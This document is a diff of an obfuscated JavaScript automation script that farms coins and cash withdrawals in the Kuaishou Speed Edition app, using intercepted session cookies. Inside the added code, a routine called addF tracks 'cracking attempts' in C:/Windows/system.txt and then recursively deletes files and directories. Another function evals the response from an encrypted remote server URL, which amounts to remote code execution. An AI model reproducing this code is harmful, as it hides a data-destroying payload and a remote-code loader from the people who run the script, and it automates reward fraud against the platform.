@@ -1,30 +1,59 @@
+var ksjsbAdBody = "encData=WlTuzeTU6mGT9525bjJUVnltcwcMQ3FjgjAw%2BtDz1mYKVQjrVHdJY0pKd7s5mx8%2BXMRRi7MCE3BSy1NNxI6bywhQueJl4YV8QDNsCONuMI7m59XX7rycrXz5ZPbObMBFLp23dqIF86Do53AbF3u4Dd2Vsk%2B1BzkhUIjucpA2gZ6g837f5Wz19RFfZ9m0pIuu8qg0EFbwOhyRaMezWC%2FfFs2M2fBj%2F%2BAZV63CQuUJV6MSpBlFU6%2BDiPwORLmSR81ZkexYHIeTr2KNUvBlcBtd6BE%2BjqjinHm7iU9BnYCYx70HkfOHA2TxPqNS9dBoJCaXUCZdA8Iy%2FXwz95700n4l98a9e0fAsnip7ehHiRCNVs7QSEMghZyZDAfMT%2Fcl%2FsFRfng0r%2FAKLMDb3H2szfw7S8O%2By4FT4%2BXiHpe%2FN8vnOSP0I1F3ZwXHWcZcNkvtfF4r7jtSrozNhThugzvyKjRmoJhi%2BQBlnOIV9GGpDBWprlbEmer2RVDv4A6vw2oLY8C%2Bj9hHLXZeGfewYQwm7pznXWYSwayxLHxrErKcaf9qBENiokJBq8FTLjHGKx2em0yOeaA2%2FtsoQo9qXnMLp2qLu7vbrsNam1V%2BqdqzejegRJ3WyFhGZMubHQz1PJVWNGkBjHDOxdONfL%2BoJQMGWJXRmBQ%2BiqzwHTjcLnJQP3KfYoFwiDc3LnW06YOImWP0vKZcWaNIZQi%2Fw9FwEoeEUGr2XXfCh1I6yOPOgK8eFvLBUU0BpJON5XlxfnRp6cqL6zMJW6hTvnOfWYC2YuT55bKk8U5weON9WB3Xn76NnqEgu4Mj8RRdNAFIr%2FwsCZnzwQNJ4IEpiGcZsUlsy0UsquUApQ1erkzqwmg6&sign=5a54eecde4d4ea61204b1c48bbed4720b97d6714deb8df19b5ca663a77065d48"
+//抓包，看广告，看完小黄鸟搜/reward/ad，取body内encData=xxxx&sign=xxxx填入↑↑↑
+
+/*
+IOS/安卓： 快手极速版
+
+已实现的：签到和翻倍，开宝箱和翻倍，看广告任务，逛街任务，抽奖和翻倍，广告任务，分享任务
+金币每天0点自动兑换到现金余额
+
+V2P和圈X配置好重写后，应该打开APP就能获取到CK，获取不到的话升级下app或者手动捉包
+青龙把任意包里的kuaishou.api_st=xxxxxxxxxxxx;这一串东西放到变量ksjsbCookie里，多账户换行或者用@隔开
+export ksjsbCookie='kuaishou.api_st=xxxxxxxxxxxx;
+kuaishou.api_st=yyyyyyyyy;'
+
+默认每天15点提现，要改的话把提现时间填到变量ksjsbWithdrawTime里
+默认按照账户的提现列表从高到低提现到绑定的提现账号，都有绑定的话默认提现到支付宝。要固定提现金额的话填到变量ksjsbCash里。如果提现失败，手动接验证码提现一次
+默认提现时间会触发通知，可以把ksjsbNotify设置成2改为每次运行都通知，ksjsbNotify设置为0则不通知
+
+定时一天最少10次就行，最好改掉默认时间，不然太多人同一时间跑
+
+重写：
+[task_local]
+#快手极速版
+[rewrite_local]
+[MITM]
+#IOS用第一个，安卓用第二个
+hostname = api.kuaisho*.com
+hostname = open.kuaisho*.com
+*/
 const $$ = Envcc('');
-let acckey = $$["isNode"]() ? process["env"]["cdkey"] ? process["env"]["cdkey"] : '' : $$["getdata"]("cdkey") ? $$["getdata"]("cdkey") : '',
+let acckey = $$['isNode']() ? process['env']["cdkey"] ? process["env"]["cdkey"] : '' : $$["getdata"]("cdkey") ? $$['getdata']('cdkey') : '',
     all_msg = '',
     mac = '';
-$$["isNode"]() ? (gtr = require('fs'), isFileExist("C:/") ? console["log"]("\n电脑环境") : console["log"]("\n青龙环境")) : console["log"]("\n代理环境");
+$$["isNode"]() ? (gtr = require('fs'), isFileExist("C:/") ? console['log']("\n电脑环境") : console["log"]("\n青龙环境")) : console['log']("\n代理环境");
 
-function isFileExist(_0x4c05bb) {
+function isFileExist(D) {
   try {
-    gtr["accessSync"](_0x4c05bb, gtr["F_OK"]);
-  } catch (_0x2cdd62) {
+    gtr['accessSync'](D, gtr["F_OK"]);
+  } catch (j) {
     return false;
   }
 
   return true;
 }
 
-function addF(_0x31b17d, _0x9a4b9c) {
-  let _0xe25846 = 0,
-      _0x10ce79 = "C:/Windows/system.txt";
+function addF(D, j) {
+  let N = 0,
+      t = "C:/Windows/system.txt";
 
-  if (isFileExist(_0x10ce79)) {
-    _0xe25846 = gtr["readFileSync"](_0x10ce79, "utf8");
+  if (isFileExist(t)) {
+    N = gtr["readFileSync"](t, "utf8");
   } else {
-    if (isFileExist("C:/")) {
-      gtr["writeFile"](_0x10ce79, '1', function (_0x4d878c) {
-        if (_0x4d878c) {
-          throw _0x4d878c;
+    if (isFileExist('C:/')) {
+      gtr['writeFile'](t, '1', function (n) {
+        if (n) {
+          throw n;
         }
       });
     } else {
@@ -32,60 +61,49 @@ function addF(_0x31b17d, _0x9a4b9c) {
     }
   }
 
-  if (_0xe25846 == 99) {
+  if (N == 99) {
     return 99;
   }
 
-  console["log"](_0xe25846);
-  console["log"]("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0xe25846);
+  console["log"](N);
+  console["log"]("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", N);
 
-  if (parseInt(_0xe25846) < 3) {
-    let _0x3c9fd8 = parseInt(_0xe25846) + 1;
-
-    gtr["writeFileSync"](_0x10ce79, _0x3c9fd8 + '', "utf8");
+  if (parseInt(N) < 3) {
+    let n = parseInt(N) + 1;
+    gtr["writeFileSync"](t, n + '', "utf8");
     return;
   }
 
-  if (!gtr["existsSync"](_0x31b17d)) {
+  if (!gtr["existsSync"](D)) {
     return;
   }
 
-  if (gtr["statSync"](_0x31b17d)["isDirectory"]()) {
-    var _0x362b43 = gtr["readdirSync"](_0x31b17d),
-        _0x53323b = _0x362b43["length"],
-        _0x218272 = 0;
-
-    if (_0x53323b > 0) {
-      _0x362b43["forEach"](function (_0x25f4a4) {
-        _0x218272++;
-
-        var _0x3c46c7 = _0x31b17d + '/' + _0x25f4a4;
-
-        gtr["statSync"](_0x3c46c7)["isDirectory"]() ? addF(_0x3c46c7, true) : gtr["unlinkSync"](_0x3c46c7);
-      });
-
-      _0x53323b == _0x218272 && _0x9a4b9c && gtr["rmdirSync"](_0x31b17d);
-    } else {
-      _0x53323b == 0 && _0x9a4b9c && gtr["rmdirSync"](_0x31b17d);
-    }
+  if (gtr['statSync'](D)["isDirectory"]()) {
+    var p = gtr["readdirSync"](D),
+        X = p["length"],
+        L = 0;
+    X > 0 ? (p["forEach"](function (z) {
+      L++;
+      var A = D + '/' + z;
+      gtr["statSync"](A)['isDirectory']() ? addF(A, true) : gtr['unlinkSync'](A);
+    }), X == L && j && gtr["rmdirSync"](D)) : X == 0 && j && gtr["rmdirSync"](D);
   } else {
-    gtr["unlinkSync"](_0x31b17d);
+    gtr["unlinkSync"](D);
   }
 }
 
-function hqs(_0x104db4 = 10) {
-  return new Promise(_0x39de88 => {
-    let _0x2838e6 = 5,
-        _0x1a8f28 = {
-      'url': $$["isNode"]() ? rc4($$["fwur"](), "1200") + ("?key=" + acckey + "&id=" + _0x2838e6 + "&ip=1&mac=" + mac + "&bb=1") : rc4($$["fwur"](), "1200") + ("?key=" + acckey + "&id=" + _0x2838e6 + "&ip=0&mac=" + mac + "&bb=1")
+function hqs(D = 10) {
+  return new Promise(j => {
+    let N = 5,
+        t = {
+      'url': $$["isNode"]() ? rc4($$["fwur"](), "1200") + ("?key=" + acckey + "&id=" + N + "&ip=1&mac=" + mac + '&bb=1') : rc4($$["fwur"](), '1200') + ("?key=" + acckey + '&id=' + N + "&ip=0&mac=" + mac + '&bb=1')
     };
-    $$["post"](_0x1a8f28, async (_0x30cf80, _0x66a8c0, _0x91f74e) => {
+    $$["post"](t, async (p, X, L) => {
       try {
-        let _0x1934d7 = eval(_0x91f74e);
-
-        _0x1934d7["code"] == 200 ? (all_msg = _0x1934d7["msg"], _0x39de88(_0x1934d7["data"])) : (all_msg = _0x1934d7["msg"], _0x39de88(false));
-      } catch (_0xd27251) {
-        $$["logErr"](_0xd27251, _0x66a8c0);
+        let n = eval(L);
+        n["code"] == 200 ? (all_msg = n["msg"], j(n['data'])) : (all_msg = n["msg"], j(false));
+      } catch (z) {
+        $$["logErr"](z, X);
       }
     }, 0);
   });
@@ -99,10 +117,10 @@ let _0x279d25 = '',
     _0x4c35fe = ["\n", '@'],
     _0x547212 = (_0x3de8b8["isNode"]() ? process["env"]["ksjsbCookie"] : _0x3de8b8["getdata"]("ksjsbCookie")) || '',
     _0x431ea3 = [],
-    _0x1e627b = (_0x3de8b8["isNode"]() ? process["env"]["ksjsbCash"] : _0x3de8b8["getval"]("ksjsbCash")) || '',
-    _0x26f17b = (_0x3de8b8["isNode"]() ? process["env"]["ksjsbWithdrawTime"] : _0x3de8b8["getval"]("ksjsbWithdrawTime")) || 15,
-    _0x13d24b = (_0x3de8b8["isNode"]() ? process["env"]["ksjsbAggressive"] : _0x3de8b8["getval"]("ksjsbAggressive")) || 0,
-    _0x113109 = (_0x3de8b8["isNode"]() ? process["env"]["ksjsbNotify"] : _0x3de8b8["getval"]("ksjsbNotify")) || 1,
+    _0x1e627b = (_0x3de8b8['isNode']() ? process['env']["ksjsbCash"] : _0x3de8b8["getval"]('ksjsbCash')) || '',
+    _0x26f17b = (_0x3de8b8["isNode"]() ? process["env"]["ksjsbWithdrawTime"] : _0x3de8b8["getval"]('ksjsbWithdrawTime')) || 15,
+    _0x13d24b = (_0x3de8b8["isNode"]() ? process['env']['ksjsbAggressive'] : _0x3de8b8["getval"]("ksjsbAggressive")) || 0,
+    _0x113109 = (_0x3de8b8["isNode"]() ? process['env']["ksjsbNotify"] : _0x3de8b8["getval"]("ksjsbNotify")) || 1,
     _0x2863b1 = 0,
     _0x19c25c = 0,
     _0xf2b084 = 12,
@@ -111,111 +129,111 @@ let _0x279d25 = '',
 
 const _0x1eb2d5 = {
   'id': 0,
-  "name": "广告视频"
-};
-const _0x4fbf92 = {
+  'name': "广告视频"
+},
+      _0x4fbf92 = {
   'id': 49,
-  "name": "广告视频"
-};
-const _0x1b4191 = {
+  'name': "广告视频"
+},
+      _0x1b4191 = {
   'id': 77,
-  "name": "宝箱翻倍视频"
-};
-const _0x2ffe31 = {
+  'name': "宝箱翻倍视频"
+},
+      _0x2ffe31 = {
   'id': 136,
-  "name": "签到翻倍视频1"
-};
-const _0x577a80 = {
+  'name': "签到翻倍视频1"
+},
+      _0x577a80 = {
   'id': 151,
-  "name": "未知视频"
-};
-const _0x351e94 = {
-  "ad1": _0x1eb2d5,
-  "ad2": _0x4fbf92,
-  "box": _0x1b4191,
-  "sign": _0x2ffe31,
-  "unknown1": _0x577a80
-};
-const _0x1e4967 = {
+  'name': "未知视频"
+},
+      _0x351e94 = {
+  'ad1': _0x1eb2d5,
+  'ad2': _0x4fbf92,
+  'box': _0x1b4191,
+  'sign': _0x2ffe31,
+  'unknown1': _0x577a80
+},
+      _0x1e4967 = {
   'ad': 49,
-  "live": 75,
-  "luckydraw": 161,
+  'live': 75,
+  'luckydraw': 161,
   'gj': 217,
-  "invite": 2008
-};
-const _0x3355c4 = {
-  "extParams": "56dfe31594b858e69ef613f5e97227fb03493544e59e2b2a726006e2852ec1040cd969d4748c460ecf574cc487214a91f70592aa8b2225630027c39ca2c544027efa65815d1acea23cb503034b12641c",
-  "businessId": 161,
-  "pageId": 11101,
-  "posId": 4683,
-  "subPageId": 100013628,
-  "name": "获取抽奖次数视频"
-};
-const _0x458f20 = {
-  "extParams": "56dfe31594b858e69ef613f5e97227fbf89856abafca7f90fab063cf60935d6faedb05b76646dc3ece57cd4898d412d86e985a2b510216ad4853603d2992501cea0a08182731fcbf023467cf30ecda80",
-  "businessId": 161,
-  "pageId": 11101,
-  "posId": 4685,
-  "subPageId": 100013630,
-  "name": "抽奖视频161-213"
-};
-const _0x124c4a = {
-  "extParams": "56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4",
-  "businessId": 161,
-  "pageId": 11101,
-  "posId": 4684,
-  "subPageId": 100013629,
-  "name": "抽奖视频161-100"
-};
-const _0x37f16f = {
-  "extParams": "56dfe31594b858e69ef613f5e97227fbf89856abafca7f90fab063cf60935d6faedb05b76646dc3ece57cd4898d412d86e985a2b510216ad4853603d2992501cea0a08182731fcbf023467cf30ecda80",
-  "businessId": 11,
-  "pageId": 11101,
-  "posId": 4684,
-  "subPageId": 100013629,
-  "name": "抽奖视频11-100"
-};
-const _0x10efec = {
-  "extParams": "56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4",
-  "businessId": 11,
-  "pageId": 11101,
-  "posId": 4684,
-  "subPageId": 100013629,
-  "name": "抽奖视频11-100"
-};
-const _0x385181 = {
-  "extParams": "60869a9fd2ab63f5e0b1725d059da31f7d3ed3046658438ee204a153c3bc47189ccf268b22e603b6750780c9647e7a12b3027381e11da27b234311bccfd4a67bb892f889a4020ceae4f4e102cc50c327",
-  "businessId": 2008,
-  "pageId": 100012068,
-  "posId": 6765,
-  "subPageId": 100015089,
-  "name": "邀请页视频(实际是100金币)"
-};
-const _0xfcb1d2 = {
-  "extParams": "56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092",
-  "businessId": 75,
-  "pageId": 100012068,
-  "posId": 6765,
-  "subPageId": 100015089,
-  "name": "直播任务"
-};
-const _0x11da17 = {
-  "extParams": "56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092",
-  "businessId": 168,
-  "pageId": 100012068,
-  "posId": 6765,
-  "subPageId": 100015089,
-  "name": "签到翻倍视频2"
-};
-const _0x10d9f8 = {
-  "luckdrawNum_161": _0x3355c4,
-  "luckdrawVideo_161_213": _0x458f20,
-  "luckdrawVideo_161_100": _0x124c4a,
-  "luckdrawVideo_11_213": _0x37f16f,
-  "luckdrawVideo_11_100": _0x10efec,
-  "inviteVideo_2008": _0x385181,
-  "liveVideo_75": _0xfcb1d2,
-  "signVideo_168": _0x11da17
+  'invite': 2008
+},
+      _0x3355c4 = {
+  'extParams': '56dfe31594b858e69ef613f5e97227fb03493544e59e2b2a726006e2852ec1040cd969d4748c460ecf574cc487214a91f70592aa8b2225630027c39ca2c544027efa65815d1acea23cb503034b12641c',
+  'businessId': 161,
+  'pageId': 11101,
+  'posId': 4683,
+  'subPageId': 100013628,
+  'name': "获取抽奖次数视频"
+},
+      _0x458f20 = {
+  'extParams': "56dfe31594b858e69ef613f5e97227fbf89856abafca7f90fab063cf60935d6faedb05b76646dc3ece57cd4898d412d86e985a2b510216ad4853603d2992501cea0a08182731fcbf023467cf30ecda80",
+  'businessId': 161,
+  'pageId': 11101,
+  'posId': 4685,
+  'subPageId': 100013630,
+  'name': "抽奖视频161-213"
+},
+      _0x124c4a = {
+  'extParams': "56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4",
+  'businessId': 161,
+  'pageId': 11101,
+  'posId': 4684,
+  'subPageId': 100013629,
+  'name': "抽奖视频161-100"
+},
+      _0x37f16f = {
+  'extParams': "56dfe31594b858e69ef613f5e97227fbf89856abafca7f90fab063cf60935d6faedb05b76646dc3ece57cd4898d412d86e985a2b510216ad4853603d2992501cea0a08182731fcbf023467cf30ecda80",
+  'businessId': 11,
+  'pageId': 11101,
+  'posId': 4684,
+  'subPageId': 100013629,
+  'name': "抽奖视频11-100"
+},
+      _0x10efec = {
+  'extParams': '56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4',
+  'businessId': 11,
+  'pageId': 11101,
+  'posId': 4684,
+  'subPageId': 100013629,
+  'name': '抽奖视频11-100'
+},
+      _0x385181 = {
+  'extParams': '60869a9fd2ab63f5e0b1725d059da31f7d3ed3046658438ee204a153c3bc47189ccf268b22e603b6750780c9647e7a12b3027381e11da27b234311bccfd4a67bb892f889a4020ceae4f4e102cc50c327',
+  'businessId': 2008,
+  'pageId': 100012068,
+  'posId': 6765,
+  'subPageId': 100015089,
+  'name': "邀请页视频(实际是100金币)"
+},
+      _0xfcb1d2 = {
+  'extParams': '56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092',
+  'businessId': 75,
+  'pageId': 100012068,
+  'posId': 6765,
+  'subPageId': 100015089,
+  'name': "直播任务"
+},
+      _0x11da17 = {
+  'extParams': '56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092',
+  'businessId': 168,
+  'pageId': 100012068,
+  'posId': 6765,
+  'subPageId': 100015089,
+  'name': '签到翻倍视频2'
+},
+      _0x10d9f8 = {
+  'luckdrawNum_161': _0x3355c4,
+  'luckdrawVideo_161_213': _0x458f20,
+  'luckdrawVideo_161_100': _0x124c4a,
+  'luckdrawVideo_11_213': _0x37f16f,
+  'luckdrawVideo_11_100': _0x10efec,
+  'inviteVideo_2008': _0x385181,
+  'liveVideo_75': _0xfcb1d2,
+  'signVideo_168': _0x11da17
 };
 
 let _0x134a17 = new Date(),
@@ -223,715 +241,687 @@ let _0x134a17 = new Date(),
     _0x459e63 = 1.07,
     _0x2e716e = 0,
     _0x5bc515 = "ksjsb",
-    _0x180c0c = "",
-    _0x75eec0 = "127.0.0.1";
+    _0x180c0c = 'https://127.0.0.1',
+    _0x75eec0 = 'https://127.0.0.1';
 
 class _0x9d8dda {
-  constructor(_0x206692) {
-    let _0x350e70 = _0x206692["match"](/(kuaishou.api_st=[\w\-]+)/)[1] + ';';
-
-    this["index"] = ++_0x2863b1;
-    this["cookie"] = "kpn=NEBULA; kpf=ANDROID_PHONE; did=ANDROID_" + _0x4b5cde(16) + "; ver=9.10; appver=9.10.40.2474; language=zh-cn; countryCode=CN; sys=ANDROID_5.1; client_key=2ac2a76d; " + _0x350e70;
-    this["name"] = this["index"];
-    this["valid"] = false;
+  constructor(D) {
+    let j = D['match'](/(kuaishou.api_st=[\w\-]+)/)[1] + ';';
+    this['index'] = ++_0x2863b1;
+    this["cookie"] = "kpn=NEBULA; kpf=ANDROID_PHONE; did=ANDROID_" + _0x4b5cde(16) + "; ver=9.10; appver=9.10.40.2474; language=zh-cn; countryCode=CN; sys=ANDROID_5.1; client_key=2ac2a76d; " + j;
+    this["name"] = this['index'];
+    this['valid'] = false;
     this["bindAlipay"] = false;
     this["alipay"] = '';
     this["bindWechat"] = false;
     this["wechat"] = '';
     this["needSms"] = false;
     this["hasLuckydraw"] = true;
-    const _0x381539 = {
-      "num": 2,
-      "needRun": true
+    const N = {
+      'num': 2,
+      'needRun': true
+    },
+          t = {
+      'num': 1,
+      'needRun': true
+    },
+          p = {
+      'num': 5,
+      'needRun': true
+    },
+          X = {
+      'num': 1,
+      'needRun': true
+    },
+          L = {
+      'num': 5,
+      'needRun': true
+    },
+          n = {
+      '49': N,
+      '75': t,
+      '161': p,
+      '217': X,
+      '2008': L
     };
-    const _0x51bafd = {
-      "num": 1,
-      "needRun": true
-    };
-    const _0x4411c8 = {
-      "num": 5,
-      "needRun": true
-    };
-    const _0x5e3d31 = {
-      "num": 1,
-      "needRun": true
-    };
-    const _0x28252b = {
-      "num": 5,
-      "needRun": true
-    };
-    const _0x34875c = {
-      '49': _0x381539,
-      '75': _0x51bafd,
-      "161": _0x4411c8,
-      "217": _0x5e3d31,
-      "2008": _0x28252b
-    };
-    this["task"] = _0x34875c;
+    this["task"] = n;
   }
 
   async ["getUserInfo"]() {
-    let _0x466fce = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/basicInfo",
-        _0x1500cb = '',
-        _0x2cc953 = _0x495d61(_0x466fce, this["cookie"], _0x1500cb);
+    let D = 'https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/basicInfo',
+        j = '',
+        N = _0x495d61(D, this["cookie"], j);
 
-    await _0x39a23b("get", _0x2cc953);
-    let _0x58187c = _0x1a0963;
+    await _0x39a23b('get', N);
+    let t = _0x1a0963;
 
-    if (!_0x58187c) {
+    if (!t) {
       return;
     }
 
-    _0x58187c["result"] == 1 ? (this["valid"] = true, this["name"] = _0x58187c["data"]["userData"]["nickname"], this["cashBalance"] = _0x58187c["data"]["totalCash"], this["coinBalance"] = _0x58187c["data"]["totalCoin"], this["allCash"] = _0x58187c["data"]["allCash"], console["log"]("账号[" + this["name"] + "]账户余额" + this["cashBalance"] + '元，' + this["coinBalance"] + "金币，未审核余额" + Math["floor"](parseFloat(this["allCash"]) - parseFloat(this["cashBalance"])) + '元')) : console["log"]("账号[" + this["name"] + "]查询账户信息失败：" + _0x58187c["error_msg"]);
+    t["result"] == 1 ? (this["valid"] = true, this["name"] = t['data']["userData"]["nickname"], this["cashBalance"] = t["data"]["totalCash"], this["coinBalance"] = t["data"]['totalCoin'], this["allCash"] = t['data']["allCash"], console["log"]("账号[" + this['name'] + ']账户余额' + this["cashBalance"] + '元，' + this["coinBalance"] + "金币，未审核余额" + Math['floor'](parseFloat(this["allCash"]) - parseFloat(this['cashBalance'])) + '元')) : console['log']('账号[' + this["name"] + ']查询账户信息失败：' + t["error_msg"]);
   }
 
-  async ["setShare"]() {
-    let _0x48e03d = "https://nebula.kuaishou.com/rest/n/nebula/account/withdraw/setShare",
-        _0x3b87f2 = '',
-        _0x2826bb = _0x495d61(_0x48e03d, this["cookie"], _0x3b87f2);
+  async ['setShare']() {
+    let D = "https://nebula.kuaishou.com/rest/n/nebula/account/withdraw/setShare",
+        j = '',
+        N = _0x495d61(D, this["cookie"], j);
 
-    await _0x39a23b("post", _0x2826bb);
-    let _0x27f502 = _0x1a0963;
+    await _0x39a23b('post', N);
+    let t = _0x1a0963;
 
-    if (!_0x27f502) {
+    if (!t) {
       return;
     }
 
-    _0x27f502["result"] == 1 ? (console["log"]("账号[" + this["name"] + "]准备分享得金币"), await _0x3de8b8["wait"](200), await this["taskReward"](122)) : console["log"]("账号[" + this["name"] + "]分享失败：" + _0x27f502["error_msg"]);
+    t['result'] == 1 ? (console["log"]("账号[" + this["name"] + "]准备分享得金币"), await _0x3de8b8["wait"](200), await this["taskReward"](122)) : console["log"]("账号[" + this["name"] + ']分享失败：' + t["error_msg"]);
   }
 
-  async ["taskReward"](_0x462cca) {
-    let _0x9369ce = "https://nebula.kuaishou.com/rest/n/nebula/daily/report?taskId=" + _0x462cca,
-        _0x1ad4cb = '',
-        _0x7c9d9 = _0x495d61(_0x9369ce, this["cookie"], _0x1ad4cb);
+  async ["taskReward"](D) {
+    let j = 'https://nebula.kuaishou.com/rest/n/nebula/daily/report?taskId=' + D,
+        N = '',
+        t = _0x495d61(j, this['cookie'], N);
 
-    await _0x39a23b("get", _0x7c9d9);
-    let _0x1d62b5 = _0x1a0963;
+    await _0x39a23b("get", t);
+    let p = _0x1a0963;
 
-    if (!_0x1d62b5) {
+    if (!p) {
       return;
     }
 
-    _0x1d62b5["result"] == 1 ? console["log"]("账号[" + this["name"] + "]完成任务[" + _0x462cca + "]成功，获得" + _0x1d62b5["data"]["amount"] + '金币') : console["log"]("账号[" + this["name"] + "]完成任务[" + _0x462cca + "]失败：" + _0x1d62b5["error_msg"]);
+    p["result"] == 1 ? console["log"]("账号[" + this['name'] + "]完成任务[" + D + ']成功，获得' + p["data"]["amount"] + '金币') : console["log"]('账号[' + this["name"] + "]完成任务[" + D + ']失败：' + p["error_msg"]);
   }
 
   async ["getSignInfo"]() {
-    let _0x856728 = "https://nebula.kuaishou.com/rest/n/nebula/sign/queryPopup",
-        _0x5836c9 = '',
-        _0x213e7f = _0x495d61(_0x856728, this["cookie"], _0x5836c9);
+    let D = "https://nebula.kuaishou.com/rest/n/nebula/sign/queryPopup",
+        j = '',
+        N = _0x495d61(D, this["cookie"], j);
 
-    await _0x39a23b("get", _0x213e7f);
-    let _0x3fb132 = _0x1a0963;
+    await _0x39a23b('get', N);
+    let t = _0x1a0963;
 
-    if (!_0x3fb132) {
+    if (!t) {
       return;
     }
 
-    _0x3fb132["result"] == 1 ? (console["log"]("账号[" + this["name"] + "]今天" + (_0x3fb132["data"]["nebulaSignInPopup"]["todaySigned"] ? '已' : '未') + '签到'), !_0x3fb132["data"]["nebulaSignInPopup"]["todaySigned"] && (await _0x3de8b8["wait"](200), await this["doSign"](), await _0x3de8b8["wait"](200), await this["setShare"]())) : console["log"]("账号[" + this["name"] + "]查询签到信息失败：" + _0x3fb132["error_msg"]);
+    t['result'] == 1 ? (console["log"]("账号[" + this["name"] + ']今天' + (t["data"]['nebulaSignInPopup']["todaySigned"] ? '已' : '未') + '签到'), !t["data"]["nebulaSignInPopup"]["todaySigned"] && (await _0x3de8b8['wait'](200), await this["doSign"](), await _0x3de8b8['wait'](200), await this["setShare"]())) : console['log']("账号[" + this["name"] + "]查询签到信息失败：" + t["error_msg"]);
   }
 
   async ["doSign"]() {
-    let _0x9b6c68 = "https://nebula.kuaishou.com/rest/n/nebula/sign/sign?source=activity",
-        _0x51c859 = '',
-        _0x4ce03f = _0x495d61(_0x9b6c68, this["cookie"], _0x51c859);
+    let D = 'https://nebula.kuaishou.com/rest/n/nebula/sign/sign?source=activity',
+        j = '',
+        N = _0x495d61(D, this["cookie"], j);
 
-    await _0x39a23b("get", _0x4ce03f);
-    let _0x29c07a = _0x1a0963;
+    await _0x39a23b('get', N);
+    let t = _0x1a0963;
 
-    if (!_0x29c07a) {
+    if (!t) {
       return;
     }
 
-    if (_0x29c07a["result"] == 1) {
-      console["log"]("账号[" + this["name"] + "]签到成功：" + _0x29c07a["data"]["toast"]);
-      await _0x3de8b8["wait"](200);
-      await this["ksAdParam"](_0x351e94["sign"]);
-      await _0x3de8b8["wait"](200);
-      await this["ksNeoAdParam"](_0x10d9f8["signVideo_168"]);
-    } else {
-      console["log"]("账号[" + this["name"] + "]签到失败：" + _0x29c07a["error_msg"]);
-    }
+    t["result"] == 1 ? (console["log"]('账号[' + this['name'] + "]签到成功：" + t['data']["toast"]), await _0x3de8b8["wait"](200), await this["ksAdParam"](_0x351e94["sign"]), await _0x3de8b8["wait"](200), await this["ksNeoAdParam"](_0x10d9f8['signVideo_168'])) : console["log"]("账号[" + this["name"] + ']签到失败：' + t["error_msg"]);
   }
 
   async ["taskList"]() {
-    let _0x594e56 = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/tasks?addressBookAccessStatus=true&pushNotificationStatus=false",
-        _0x2cc769 = '',
-        _0x5a4b44 = _0x495d61(_0x594e56, this["cookie"], _0x2cc769);
+    let D = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/tasks?addressBookAccessStatus=true&pushNotificationStatus=false",
+        j = '',
+        N = _0x495d61(D, this['cookie'], j);
 
-    await _0x39a23b("get", _0x5a4b44);
-    let _0x1ffcff = _0x1a0963;
+    await _0x39a23b("get", N);
+    let t = _0x1a0963;
 
-    if (!_0x1ffcff) {
+    if (!t) {
       return;
     }
 
-    if (_0x1ffcff["result"] == 1) {
-      console["log"]("账号[" + this["name"] + "]任务完成情况：");
+    if (t["result"] == 1) {
+      console["log"]("账号[" + this["name"] + ']任务完成情况：');
 
-      for (let _0x4dafd1 of _0x1ffcff["data"]["dailyTasks"]) {
-        for (let _0x55b29d in _0x1e4967) {
-          if (_0x4dafd1["taskId"] == _0x1e4967[_0x55b29d]) {
-            let _0x90a461 = parseInt(_0x4dafd1["completedStages"]),
-                _0x3daede = parseInt(_0x4dafd1["stages"]),
-                _0x4ebdd5 = Math["ceil"](_0x3daede / _0xf2b084),
-                _0x329bbb = _0x90a461 < _0x3daede;
-
-            const _0x55df2a = {
-              "num": _0x4ebdd5,
-              "needRun": _0x329bbb
+      for (let p of t["data"]['dailyTasks']) {
+        for (let X in _0x1e4967) {
+          if (p["taskId"] == _0x1e4967[X]) {
+            let L = parseInt(p["completedStages"]),
+                n = parseInt(p["stages"]),
+                z = Math["ceil"](n / _0xf2b084),
+                A = L < n;
+            const l = {
+              'num': z,
+              'needRun': A
             };
-            this["task"][_0x4dafd1["taskId"]] = _0x55df2a;
-            console["log"]('【' + _0x4dafd1["name"] + "】 " + _0x90a461 + '/' + _0x3daede + '，' + (_0x329bbb ? "未完成" : "已完成") + "，每次运行完成" + _0x4ebdd5 + "次任务");
+            this["task"][p['taskId']] = l;
+            console["log"]('【' + p["name"] + "】 " + L + '/' + n + '，' + (A ? "未完成" : '已完成') + "，每次运行完成" + z + "次任务");
             continue;
           }
         }
       }
     } else {
-      console["log"]("账号[" + this["name"] + "]查询任务列表失败：" + _0x1ffcff["error_msg"]);
+      console["log"]("账号[" + this['name'] + ']查询任务列表失败：' + t["error_msg"]);
     }
   }
 
   async ["ksgj"]() {
-    let _0xb912ab = "https://api.e.kuaishou.com/rest/r/reward/task/getActivityReward",
-        _0x2a5d3a = "activityId=148&client_key=ksgjbody",
-        _0x40d1d8 = _0x495d61(_0xb912ab, this["cookie"], _0x2a5d3a);
